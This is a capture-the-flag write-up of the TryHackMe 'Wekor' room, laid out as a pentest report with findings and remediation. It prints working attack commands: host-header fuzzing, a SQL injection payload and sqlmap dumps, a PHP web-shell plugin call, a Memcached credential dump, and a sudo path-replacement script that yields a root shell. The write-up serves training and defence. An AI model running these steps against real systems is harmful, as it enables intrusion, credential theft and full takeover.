---
title: "TryHackMe: Wekor"
date: 2026-06-28 23:50:00 +0200
categories: [TryHackMe]
tags:
  - web
  - wordpress
  - sqli
  - memcached
  - linux
  - privilege-escalation
  - vhost
description: >-
  Wekor chained virtual-host discovery and SQL injection into WordPress
  administrator compromise, plugin-based command execution, plaintext
  Memcached credentials, and a sudo path replacement to reach root.
author: lenovolegion7
media_subpath: /images/tryhackme_wekor
image:
  path: room_image.webp
  alt: "Original TryHackMe Wekor room artwork"
toc: true
comments: false
---

Wekor is a multi-stage web-to-root compromise. The validated path moves from virtual-host and hidden-content discovery into SQL injection on a coupon workflow, WordPress administrator compromise, authenticated plugin upload for command execution as `www-data`, plaintext Linux credentials exposed in Memcached, and finally a sudo path-replacement flaw that yields a root shell.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Wekor room card](room_card.webp){: w="300" h="275" .shadow }](https://tryhackme.com/room/wekorra){: .center }

## Initial Enumeration

The target exposed a web application that relied on virtual hosts. Enumeration identified:

```text
wekor.thm
site.wekor.thm
```

The valid WordPress virtual host was discovered with host-header fuzzing:

```console
$ ffuf \
  -u http://TARGET_IP/ \
  -H 'Host: FUZZ.wekor.thm' \
  -w subdomains-top1million-5000.txt
```

The result revealed:

```text
site.wekor.thm
```

A review of `robots.txt` on `wekor.thm` disclosed additional paths, including:

```text
/it-next/
```

## Validated Attack Path

1. **Virtual-host discovery** — identified `site.wekor.thm` as a valid vhost.
2. **Hidden-content discovery** — `robots.txt` disclosed `/it-next/`.
3. **SQL injection** — `coupon_code` on `/it-next/it_cart.php` was injectable and exposed the `wordpress` database.
4. **Credential compromise** — dumped `wp_users` and cracked the `wp_yura` administrator password.
5. **WordPress RCE** — authenticated as `wp_yura`, uploaded a PHP command plugin, and obtained command execution as `www-data`.
6. **Internal service enumeration** — discovered Memcached on `localhost:11211`.
7. **Lateral movement** — Memcached exposed plaintext credentials for the Linux user `Orka`.
8. **Privilege escalation** — abused a sudo rule referencing `/home/Orka/Desktop/bitcoin`, replaced the user-controlled parent path, and obtained a root shell.

> **Result:** An unauthenticated web attack was chained through SQL injection, WordPress administration, local secret exposure, and a sudo path flaw to complete root compromise.
{: .prompt-danger }

## SQL Injection in the Coupon Workflow

The vulnerable endpoint accepted user-controlled `coupon_code` input:

```http
POST /it-next/it_cart.php
coupon_code=test'&apply_coupon=Apply+Coupon
```

The application returned a MySQL syntax error, and testing confirmed multiple SQL injection techniques.

`sqlmap` identified the parameter as injectable:

```console
$ sqlmap \
  -u 'http://wekor.thm/it-next/it_cart.php' \
  --data='coupon_code=test&apply_coupon=Apply+Coupon' \
  -p coupon_code \
  --dbs
```

Enumerated databases included:

```text
coupons
wordpress
mysql
information_schema
performance_schema
sys
```

The WordPress user table was then dumped:

```console
$ sqlmap ... \
  -D wordpress \
  -T wp_users \
  --dump
```

The relevant account was:

```text
user_login: wp_yura
user_pass: [REDACTED]
```

The password was cracked offline:

```text
wp_yura : [REDACTED]
```

## WordPress Administrator Compromise

The `wp_yura` account held administrator privileges.

After authentication, WordPress plugin upload functionality was used to install a small command-execution plugin.

A command check confirmed execution:

```console
$ curl \
  'http://site.wekor.thm/wordpress/wp-content/plugins/wekorcmd/wekorcmd.php?cmd=id'
```

The result was:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This established the initial Linux foothold as the web-server user.

## Internal Memcached Credential Disclosure

Local service enumeration revealed:

```text
localhost:11211
```

Memcached was queried locally:

```console
$ printf 'stats cachedump 1 100\nquit\n' |
  nc localhost 11211
```

Relevant keys included:

```text
username
password
email
```

The cached values exposed a Linux account:

```text
username: Orka
password: [REDACTED]
email: Orka@wekor.thm
```

The plaintext password enabled lateral movement from `www-data` to the `Orka` user.

## Sudo Path Replacement Privilege Escalation

The `Orka` user had a sudo rule for:

```text
(root) /home/Orka/Desktop/bitcoin
```

Although the original binary was root-owned, the parent path was controlled by `Orka`.

The exploit replaced the parent `Desktop` directory and supplied a new executable at the exact sudo-approved path:

```console
$ mv /home/Orka/Desktop /home/Orka/Desktop.bak
$ mkdir /home/Orka/Desktop

$ printf '#!/bin/bash\n/bin/bash -p\n' \
  > /home/Orka/Desktop/bitcoin

$ chmod +x /home/Orka/Desktop/bitcoin
$ sudo /home/Orka/Desktop/bitcoin
```

The resulting context confirmed root:

```console
# id
uid=0(root) gid=0(root) groups=0(root)
```

The user and root objectives were both obtained during the assessment and are redacted here.

## Additional Credential Exposure

The WordPress configuration file was readable from the compromised web-server context:

```text
/var/www/html/site.wekor.thm/wordpress/wp-config.php
```

It contained MySQL root credentials:

```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', '[REDACTED]');
define('DB_HOST', 'localhost');
```

Using a database root account from a web application configuration significantly increases impact after web-server compromise.

## Findings

### F-01 — SQL Injection in `coupon_code`

- **Severity:** Critical
- **Affected endpoint:** `/it-next/it_cart.php`
- **Impact:** Database disclosure, credential extraction, and account takeover

The coupon workflow passed untrusted input into a MySQL query without safe parameterization.

**Remediation:**

- use parameterized queries or prepared statements;
- validate `coupon_code` using an allowlist;
- suppress verbose SQL errors in production;
- run the application with a least-privilege database account;
- add regression tests for injection payloads.

### F-02 — Weak WordPress Administrator Password

- **Severity:** High
- **Affected account:** `wp_yura`

The extracted WordPress administrator hash was crackable with a weak password.

**Remediation:**

- enforce strong administrator passwords;
- use breached-password blocklists;
- require MFA for WordPress administrators;
- rotate credentials after compromise;
- monitor unusual administrator logins and plugin installations.

### F-03 — WordPress Plugin Upload Enabled Arbitrary PHP Execution

- **Severity:** Critical
- **Impact:** Remote command execution as `www-data`

Administrative plugin upload provided a direct path from account compromise to OS command execution.

**Remediation:**

- restrict plugin installation to tightly controlled administrators;
- disable direct plugin/theme editing;
- consider `DISALLOW_FILE_MODS` where operationally feasible;
- monitor creation of PHP files in plugin directories;
- remove unauthorized plugins.

### F-04 — Plaintext Credentials Stored in Memcached

- **Severity:** High
- **Affected service:** Memcached on `localhost:11211`

Memcached stored reusable Linux credentials in plaintext.

**Remediation:**

- never cache plaintext passwords or long-lived secrets;
- flush exposed cache contents;
- rotate the `Orka` credential;
- use short-lived tokens or protected secret storage instead;
- restrict local service access to only required processes.

### F-05 — Sudo Rule Referenced a User-Controlled Path

- **Severity:** Critical
- **Affected path:** `/home/Orka/Desktop/bitcoin`
- **Impact:** Root shell

The sudo rule trusted an executable path located beneath a user-controlled parent directory. Replacing the directory allowed a different binary to occupy the same approved path.

**Remediation:**

- never grant sudo access to executables beneath writable user directories;
- move privileged helpers into root-owned locations such as `/usr/local/sbin`;
- restrict write permissions on every parent directory in the path;
- use command digests in sudoers where appropriate;
- review sudoers for `/home`, `/tmp`, `/var/tmp`, and upload paths.

### F-06 — MySQL Root Credentials in WordPress Configuration

- **Severity:** High
- **Affected file:** `wp-config.php`

The web application used the MySQL root account and stored the password in a file readable by the compromised web-server user.

**Remediation:**

- create a dedicated least-privilege WordPress database account;
- rotate the MySQL root password;
- restrict `wp-config.php` permissions;
- avoid database root credentials in application configurations.

### F-07 — Exposed Virtual Host and WordPress Metadata

- **Severity:** Medium

Virtual-host enumeration and WordPress metadata reduced the effort required to locate and profile the application.

Observed metadata included:

```text
WordPress 5.6
XML-RPC enabled
readme.html accessible
upload directory listing enabled
```

**Remediation:**

- disable directory listing;
- remove or restrict version-disclosing files;
- disable XML-RPC unless required;
- protect administrative endpoints;
- keep WordPress core, themes, and plugins updated.

## Security Impact

The final attack path provided complete root compromise from an unauthenticated starting position.

The most important factor was the way weaknesses compounded:

- vhost and content discovery exposed the vulnerable application;
- SQL injection disclosed WordPress authentication material;
- a weak administrator password enabled authenticated application takeover;
- WordPress plugin upload provided command execution;
- plaintext cached credentials enabled lateral movement;
- a sudo path under a user-controlled directory provided root access.

## Remediation Priorities

1. Fix the `coupon_code` SQL injection with parameterized queries.
2. Rotate WordPress, MySQL, and `Orka` credentials.
3. Remove unauthorized WordPress command plugins.
4. Restrict WordPress plugin installation and require MFA.
5. Remove plaintext credential objects from Memcached.
6. Replace MySQL root usage with a least-privilege account.
7. Remove the sudo rule referencing `/home/Orka/Desktop/bitcoin`.
8. Move privileged helper binaries into root-owned directories.
9. Disable unnecessary WordPress metadata and directory listing.
10. Add centralized monitoring for new plugins, sensitive cache keys, and sudo changes.

## Retest Plan

1. Confirm SQL injection payloads against `coupon_code` no longer alter query logic or expose SQL errors.
2. Verify `wp_yura` and other administrator credentials have been rotated and MFA is enforced.
3. Confirm unauthorized plugin upload or editing is blocked.
4. Verify Memcached no longer contains usernames, passwords, or other long-lived secrets.
5. Confirm `Orka` cannot invoke a sudo-approved executable through any user-writable parent path.
6. Verify WordPress uses a least-privilege database account.
7. Confirm directory listing and version-disclosing WordPress files are disabled or restricted.

## Lessons Learned

Wekor demonstrates how a web application compromise can become a full Linux root compromise through several independent weaknesses.

No single later-stage issue needed to be remotely reachable. Once WordPress command execution was obtained, localhost-only Memcached became reachable, and the leaked Linux credential exposed a local sudo weakness. This makes service isolation, credential hygiene, and privilege-path review just as important as fixing the initial web vulnerability.
